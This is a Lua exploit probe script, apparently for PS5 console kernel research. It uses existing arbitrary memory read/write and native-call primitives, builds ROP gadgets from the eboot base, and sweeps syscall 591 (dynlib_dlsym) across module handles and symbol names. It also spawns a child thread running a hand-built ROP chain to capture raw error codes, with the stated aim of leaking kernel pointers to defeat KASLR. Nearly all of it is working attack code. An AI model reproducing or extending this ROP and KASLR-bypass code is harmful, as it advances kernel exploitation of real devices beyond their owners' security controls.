-- CRASH_CLASS: LOW
-- PROBE 68b: sys 591 dynlib_dlsym KASLR — real handles + child thread raw errno
--
-- 66a tested 591 with 8 valid handles and C/NID names: all returned -1.
-- The 13.60 decode shows NO authid/bit-62 gate but a caller-module
-- attribution check (step 4): the return address module must be a
-- "primary module" or have visibility flags at module+0x11d.
--
-- Improvements over 66a:
--   1. Sweep handles 0-255 (66a only checked 0-50, found 8)
--   2. Call 591 from child thread via ROP — capture raw rax (errno)
--      to distinguish handle error (3) from caller-attribution (3) from
--      no-dynlib-obj (1) from name-blocklist (ENOENT=2)
--   3. More NID formats: PS5 standard <11-char>#<lib>#<ver> encoding
--   4. Try handle for eboot (0) resolving its own symbols
--   5. Try empty string and 1-byte names to probe the blocklist path

print("=== PROBE 68b: DLSYM KASLR ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end

-- Build NUL-terminated C string in heap
local function cstr(s)
    local b = memory.alloc(#s + 8)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(b) + i - 1, s:byte(i)) end)
    end
    pcall(function() memory.write_byte(N(b) + #s, 0) end)
    return b
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

-- ROP gadgets
local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67  -- mov [rdi], rax; ret

-- Ignore SIGSYS and SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- ===============================
-- [A] Enumerate ALL valid handles 0-255
-- ===============================
print("")
print("[A] valid module handles 0-255")
local valid = {}
local info = memory.alloc(0x200)
for h = 0, 255 do
    wd(N(info), 0x160)
    for i = 4, 0x15C, 4 do wd(N(info) + i, 0) end
    local ok, rv = pcall(function() return mk(593)(uint64(h), info) end)
    if ok and N(rv) == 0 then
        local tlo = rd(N(info) + 0x108) or 0
        local thi = rd(N(info) + 0x10C) or 0
        if tlo < 0 then tlo = tlo + 0x100000000 end
        if thi < 0 then thi = thi + 0x100000000 end
        valid[#valid + 1] = { handle = h, text_hi = thi, text_lo = tlo }
        if #valid <= 15 then
            print(string.format("  h=%-3d text=%X_%08X", h, thi, tlo))
        end
    end
end
print(string.format("  total: %d handles (range %d-%d)",
    #valid, valid[1] and valid[1].handle or -1,
    valid[#valid] and valid[#valid].handle or -1))

if #valid == 0 then
    print("NO VALID HANDLES — abort")
    print("=== 68b DONE ===")
    return
end
if #valid > 15 then print("  (showing first 15)") end

-- ===============================
-- [B] Main thread: 591 with C names + NID formats on all handles
-- ===============================
print("")
print("[B] 591 sweep — main thread")

local out = memory.alloc(0x20)

-- Symbol names: C-style, PS5 NID format, edge cases
local names = {
    -- Standard C names (in case the kernel resolves plain names)
    "getpid", "read", "write", "close", "socket", "mmap", "mprotect",
    "malloc", "free", "printf", "exit",
    -- Sony kernel API names
    "sceKernelSleep", "sceKernelGetCpuTemperature",
    "sceKernelDlSym", "sceKernelGetModuleInfo",
    "sceKernelMapFlexibleMemory", "sceKernelMprotect",
    "sceKernelSendNotificationRequest",
    -- PS5 NID format: <11-char-base64>#<libname>#<libversion>
    -- These are approximate NID encodings for known functions
    "2OuxnbCefPQ#libkernel#1",     -- sceKernelSleep-like
    "QcteRwbsnV0#libkernel#1",     -- getpid-like
    "aA4-1so3Bh0#libkernel#1",     -- approximate
    "gQX3JSsnV0Q#libkernel#1",     -- approximate
    "HoLVWNanBBc#libkernel#1",     -- approximate pattern
    -- Module init/fini
    "module_start", "module_stop", "_init", "_fini",
    -- Edge cases
    "", "A", "AAAA",
}

local found_main = 0
for vi = 1, #valid do
    local h = valid[vi].handle
    for ni = 1, #names do
        local np = cstr(names[ni])
        wq(N(out), uint64(0xDEADDEAD))
        wq(N(out) + 8, uint64(0xDEADDEAD))

        local ok, rv = pcall(function()
            return mk(591)(uint64(h), uint64(N(np)), uint64(N(out)))
        end)
        local ret = ok and N(rv) or 0xDEAD
        local ol = rd(N(out)) or 0
        local oh = rd(N(out) + 4) or 0

        -- Check if output changed from sentinel or ret != -1
        local out_changed = (ol ~= 0xDEADDEAD) or (oh ~= 0xDEADDEAD)
        local not_error = (ret ~= 0xFFFFFFFF and ret ~= 0xDEAD)

        if out_changed or not_error then
            found_main = found_main + 1
            local is_kptr = (oh >= 0xFFFF8000 and oh ~= 0xFFFFFFFF and oh ~= 0xDEADDEAD)
            print(string.format("  %s h=%-3d %-38s rv=0x%X out=%X_%08X",
                is_kptr and "***" or "   ",
                h, names[ni], ret, oh, ol))
            if is_kptr then
                print("  *** KERNEL POINTER FOUND — KASLR DEFEAT ***")
            end
        end
    end
    if not alive() then
        print("  *** PROCESS DIED at handle " .. h .. " ***")
        break
    end
end
print(string.format("  main-thread results: %d found", found_main))

if not alive() then
    print("=== 68b DONE (died) ===")
    return
end

-- ===============================
-- [C] Child thread: call 591 via ROP, capture raw rax (FreeBSD errno)
-- ===============================
print("")
print("[C] child thread — raw errno capture via ROP")
print("  FreeBSD: on error, rax = errno (1=EPERM, 2=ENOENT, 3=ESRCH, 22=EINVAL)")
print("  13.60 decode: error 1=no dynlib obj, error 3=bad handle or caller attr")

-- sysarch(SET_FSBASE=129, &fake_tcb) to fix child errno access
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
-- Self-referencing pointer at offset 0 (TCB convention: tcb->tcb_self = tcb)
wq(N(fake_tcb), uint64(N(fake_tcb)))
local tcb_ptr = memory.alloc(8)
wq(N(tcb_ptr), uint64(N(fake_tcb)))

-- Test handles: first valid, eboot (0 if valid), last valid, invalid (99)
local test_handles = {}
if valid[1] then test_handles[#test_handles + 1] = { h = valid[1].handle, label = "first_valid" } end
-- Check if handle 0 is in the list (eboot)
local has_h0 = false
for _, v in ipairs(valid) do
    if v.handle == 0 then has_h0 = true; break end
end
if has_h0 then
    test_handles[#test_handles + 1] = { h = 0, label = "eboot(0)" }
end
if #valid >= 2 then
    test_handles[#test_handles + 1] = { h = valid[2].handle, label = "second_valid" }
end
test_handles[#test_handles + 1] = { h = 99, label = "invalid(99)" }
test_handles[#test_handles + 1] = { h = 0xFFFFFFFF, label = "minus_one" }

-- Test names for child thread
local child_names = { "getpid", "sceKernelSleep", "" }

for ti = 1, #test_handles do
    local th = test_handles[ti]
    for cni = 1, #child_names do
        local np = cstr(child_names[cni])
        local child_out = memory.alloc(0x20)
        wq(N(child_out), uint64(0xCAFECAFE))
        wq(N(child_out) + 8, uint64(0xCAFECAFE))

        -- Result location: child writes rax here after syscall
        local result = memory.alloc(8)
        wq(N(result), uint64(0xBAADF00D))

        -- Build child ROP chain
        local stk = memory.alloc(0x4000)
        local sb = N(stk)
        local rsp = sb + 0x2000 - ((sb + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb + i, 0) end

        local off = 0
        local function em(v) wq(rsp + off, v); off = off + 8 end

        -- 1. sysarch(SET_FSBASE=129, &fake_tcb)
        em(g_pop_rax); em(uint64(165))       -- sysarch syscall number
        em(g_pop_rdi); em(uint64(129))       -- SET_FSBASE
        em(g_pop_rsi); em(uint64(N(tcb_ptr)))
        em(stub)

        -- 2. sys 591(handle, name_ptr, out_ptr)
        em(g_pop_rax); em(uint64(591))
        em(g_pop_rdi); em(uint64(th.h))
        em(g_pop_rsi); em(uint64(N(np)))
        em(g_pop_rdx); em(uint64(N(child_out)))
        em(stub)

        -- 3. Write rax (raw return = errno on error) to result
        em(g_pop_rdi); em(uint64(N(result)))
        em(g_mov_m_rax)

        -- 4. thr_exit(0)
        em(g_pop_rdi); em(uint64(0))
        em(g_pop_rax); em(uint64(431))
        em(stub)

        -- Spawn child via thr_new(455)
        local par = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(par) + i, 0) end
        wq(N(par), g_bare_ret)           -- start_func = bare ret (RIP)
        wq(N(par) + 0x10, uint64(sb))    -- stack_base
        wq(N(par) + 0x18, uint64(0x2000)) -- stack_size
        local tid_out = memory.alloc(8)
        wq(N(tid_out), uint64(0))
        wq(N(par) + 0x30, tid_out)       -- child_tid

        pcall(function() mk(455)(par, uint64(0x38)) end)

        -- Spin-wait for child completion
        for w = 1, 100000 do local _ = rd(sb) end

        local raw_rax = rq(N(result))
        local rax_lo = rd(N(result)) or 0xBAADF00D
        local rax_hi = rd(N(result) + 4) or 0
        local ol = rd(N(child_out)) or 0xCAFECAFE
        local oh = rd(N(child_out) + 4) or 0xCAFECAFE

        local errno_str = "?"
        if rax_lo == 0xBAADF00D then errno_str = "CHILD_DID_NOT_RUN"
        elseif rax_lo == 0 and rax_hi == 0 then errno_str = "SUCCESS(0)"
        elseif rax_lo == 1 then errno_str = "EPERM(1)=no_dynlib_obj"
        elseif rax_lo == 2 then errno_str = "ENOENT(2)=not_found"
        elseif rax_lo == 3 then errno_str = "ESRCH(3)=bad_handle_or_caller"
        elseif rax_lo == 14 then errno_str = "EFAULT(14)=bad_ptr"
        elseif rax_lo == 22 then errno_str = "EINVAL(22)"
        elseif rax_lo == 78 then errno_str = "ENOSYS(78)"
        else errno_str = string.format("err=%d", rax_lo) end

        local is_kptr = (oh >= 0xFFFF8000 and oh ~= 0xFFFFFFFF and oh ~= 0xCAFECAFE)
        local out_changed = (ol ~= 0xCAFECAFE) or (oh ~= 0xCAFECAFE)

        print(string.format("  h=%-14s name=%-18s rax=%s out=%X_%08X %s",
            th.label, child_names[cni],
            errno_str,
            oh, ol,
            out_changed and "CHANGED" or "sentinel"))

        if is_kptr then
            print("  *** KERNEL POINTER FOUND — KASLR DEFEAT ***")
        end

        if not alive() then
            print("  *** PROCESS DIED ***")
            print("=== 68b DONE (died) ===")
            return
        end
    end
end

-- ===============================
-- [D] Raw return value from main thread (different interpretation)
-- ===============================
print("")
print("[D] main thread — signed return value analysis")
local h0 = valid[1].handle
local test_names = { "getpid", "", "sceKernelSleep", "AAAAAAAAAAA#libkernel#1" }
for ni = 1, #test_names do
    local np = cstr(test_names[ni])
    wq(N(out), uint64(0))

    local ok, rv = pcall(function()
        return mk(591)(uint64(h0), uint64(N(np)), uint64(N(out)))
    end)
    local rh, rl = 0, 0
    if ok and rv then
        rh, rl = get_hi_lo(rv)
    end
    local signed_ret = rl
    if rh == 0xFFFFFFFF then signed_ret = -1
    elseif rl >= 0x80000000 then signed_ret = rl - 0x100000000 end

    local ol = rd(N(out)) or 0
    local oh = rd(N(out) + 4) or 0
    print(string.format("  name=%-30s rv_raw=%X_%08X signed=%d out=%X_%08X",
        test_names[ni], rh, rl, signed_ret, oh, ol))
end

-- ===============================
-- [E] Summary
-- ===============================
print("")
print("[E] SUMMARY")
print(string.format("  valid handles:  %d", #valid))
print(string.format("  main-thread:    %d results", found_main))
print(string.format("  process:        %s", alive() and "ALIVE" or "DEAD"))

if found_main > 0 then
    print("  *** CHECK OUTPUT FOR KERNEL POINTERS ***")
else
    print("  All 591 calls rejected — caller-attribution or 14.10 removed handler")
    print("  If child raw_rax shows error 3 consistently: caller-module block")
    print("  If child raw_rax shows error 1: no dynlib obj (fundamental block)")
    print("  If child raw_rax shows error 78: handler is nosys (removed)")
end

print("")
print("=== 68b DONE ===")
